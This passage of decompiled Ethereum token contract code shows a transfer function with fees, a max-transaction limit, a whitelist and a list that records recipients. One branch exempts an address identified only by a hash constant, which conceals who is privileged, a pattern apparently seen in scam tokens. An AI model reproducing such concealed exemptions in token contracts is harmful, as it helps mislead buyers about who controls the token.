                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 6
                        if stor6[address(msg.sender)]:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7206 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7206 + 32 len mem[_7206]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor6[address(msg.sender)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            require ext_code.size(stor16)
                            staticcall stor16.factory() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7124 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7142 = mem[_7124]
                            require mem[_7124] == mem[_7124 + 12 len 20]
                            require ext_code.size(stor16)
                            staticcall stor16.WETH() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7190 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7226 = mem[_7190]
                            require mem[_7190] == mem[_7190 + 12 len 20]
                            mem[mem[64] + 4] = this.address
                            mem[mem[64] + 36] = address(_7226)
                            require ext_code.size(address(_7142))
                            staticcall address(_7142).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(_7226)
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7400 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7472 = mem[_7400]
                            require mem[_7400] == mem[_7400 + 12 len 20]
                            if mem[_7400 + 12 len 20] != msg.sender:
                                if stor6[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 6
                                    if stor6[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _7848 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if sha3(mem[_7848 + 32 len mem[_7848]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg1 == this.address:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if msg.sender == address(_7472):
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor14:
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor15.length++
                                                                stor15[stor15.length].field_0 = arg1
                                                                stor15[stor15.length].field_256 = arg2
                                                            if arg2 < 0:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -1:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 'NH{q', 17
                                                            if not arg2:
                                                                revert with 'NH{q', 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor15.length++
                                                                stor15[stor15.length].field_0 = arg1
                                                                stor15[stor15.length].field_256 = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100 > 0:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                            else:
                                if stor6[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 6
                                    if stor6[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _7872 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if sha3(mem[_7872 + 32 len mem[_7872]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg1 == this.address:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor6[address(arg1)]:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor14:
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor15.length++
                                                                stor15[stor15.length].field_0 = arg1
                                                                stor15[stor15.length].field_256 = arg2
                                                            if arg2 < 0:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -1:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 'NH{q', 17
                                                            if not arg2:
                                                                revert with 'NH{q', 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor15.length++
                                                                stor15[stor15.length].field_0 = arg1
                                                                stor15[stor15.length].field_256 = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100 > 0:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
    return 1
}



}
